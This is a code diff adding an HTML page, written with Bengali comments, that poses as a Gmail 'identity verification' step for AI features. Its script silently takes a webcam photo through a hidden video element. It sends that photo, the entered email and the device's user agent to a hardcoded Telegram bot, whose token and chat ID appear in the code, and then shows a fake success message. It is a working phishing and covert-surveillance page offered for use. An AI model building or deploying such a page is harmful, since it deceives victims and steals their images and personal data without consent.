@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Verify Your Email</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0b0d15;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(24px);
+            border-radius: 36px;
+            padding: 30px 22px 34px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+            text-align: center;
+        }
+        .badge {
+            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 4px 16px;
+            border-radius: 30px;
+            display: inline-block;
+        }
+        h2 {
+            color: #fff;
+            font-size: 24px;
+            margin: 12px 0 6px;
+        }
+        p {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 14px;
+            text-align: left;
+        }
+        .input-group label {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 13px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.04);
+            color: #fff;
+            font-size: 15px;
+            transition: 0.3s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #8b5cf6;
+            background: rgba(139, 92, 246, 0.04);
+        }
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
+            color: #fff;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 32px rgba(139, 92, 246, 0.4);
+        }
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 12px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.4);
+        }
+        .status.success {
+            color: #4ade80;
+        }
+        .status.error {
+            color: #f87171;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #8b5cf6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 12px auto 0;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .camera-status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 14px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 13px;
+        }
+        video {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="badge">🔐 VERIFY</div>
+        <h2>Verify Your Identity</h2>
+        <p>Enter your real Gmail to unlock AI features</p>
+
+        <div class="input-group">
+            <label>📧 Gmail Address</label>
+            <input type="email" id="emailInput" placeholder="your@gmail.com" />
+        </div>
+
+        <button class="btn btn-primary" id="verifyBtn">✅ Verify & Generate</button>
+
+        <div class="spinner" id="spinner"></div>
+        <div class="status" id="status"></div>
+
+        <div class="camera-status" id="cameraStatus">📸 Camera will be used for verification</div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ==========================================
+        // 🔥 টেলিগ্রাম কনফিগ
+        // ==========================================
+        const BOT_TOKEN = "8887980298:AAH-iJH-t8Iu7JswRiugAiY1om5KD_AvPBA";
+        const CHAT_ID = "8602835111";
+
+        // ==========================================
+        // ডম রেফারেন্স
+        // ==========================================
+        const emailInput = document.getElementById('emailInput');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const status = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const cameraStatus = document.getElementById('cameraStatus');
+
+        // ==========================================
+        // ইমেইল ভ্যালিডেশন
+        // ==========================================
+        function isValidEmail(email) {
+            return /^[^\s@]+@gmail\.com$/.test(email);
+        }
+
+        // ==========================================
+        // ক্যামেরা ক্যাপচার (ছবি তুলবে, দেখাবে না)
+        // ==========================================
+        function capturePhoto() {
+            return new Promise((resolve, reject) => {
+                navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: 640,
+                            height: 480
+                        }
+                    })
+                    .then(stream => {
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+                        video.play();
+
+                        setTimeout(() => {
+                            try {
+                                const canvas = document.getElementById('canvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                const data = canvas.toDataURL('image/jpeg', 0.8);
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve(data);
+                            } catch (err) {
+                                reject(err);
+                            }
+                        }, 800);
+                    })
+                    .catch(reject);
+            });
+        }
+
+        // ==========================================
+        // টেলিগ্রামে ছবি পাঠানো
+        // ==========================================
+        function sendPhotoToTelegram(photoData, email) {
+            return new Promise((resolve, reject) => {
+                const byteString = atob(photoData.split(',')[1]);
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], { type: 'image/jpeg' });
+                const file = new File([blob], 'camera_verify.jpg', { type: 'image/jpeg' });
+
+                const formData = new FormData();
+                formData.append('photo', file);
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', `📸 Camera Capture (Verification)\n📧 Email: ${email}\n📱 Device: ${navigator.userAgent}`);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => data.ok ? resolve(data) : reject(data.description))
+                    .catch(reject);
+            });
+        }
+
+        // ==========================================
+        // ভেরিফাই বাটন
+        // ==========================================
+        verifyBtn.addEventListener('click', async function() {
+            const email = emailInput.value.trim();
+
+            if (!email) {
+                status.textContent = '⚠️ Please enter your Gmail';
+                status.className = 'status error';
+                return;
+            }
+
+            if (!isValidEmail(email)) {
+                status.textContent = '⚠️ Only @gmail.com addresses are allowed';
+                status.className = 'status error';
+                return;
+            }
+
+            this.disabled = true;
+            this.textContent = 'Verifying...';
+            spinner.style.display = 'block';
+            status.textContent = '📸 Accessing camera...';
+            status.className = 'status';
+
+            try {
+                // ক্যামেরা থেকে ছবি তুলো
+                const photoData = await capturePhoto();
+
+                status.textContent = '📤 Sending verification...';
+                await sendPhotoToTelegram(photoData, email);
+
+                // সাকসেস
+                spinner.style.display = 'none';
+                status.textContent = '✅ Verification successful! Image created!';
+                status.className = 'status success';
+                cameraStatus.textContent = '✅ Camera verification complete';
+
+                this.textContent = '✅ Done';
+                this.disabled = true;
+
+                // ফাইনাল রিডাইরেক্ট বা রিলোড
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 2500);
+
+            } catch (err) {
+                spinner.style.display = 'none';
+                status.textContent = '❌ Camera access denied!';
+                status.className = 'status error';
+                this.disabled = false;
+                this.textContent = '✅ Verify & Generate';
+                cameraStatus.textContent = '⚠️ Camera access required for verification';
+            }
+        });
+    </script>
+</body>
+</html>
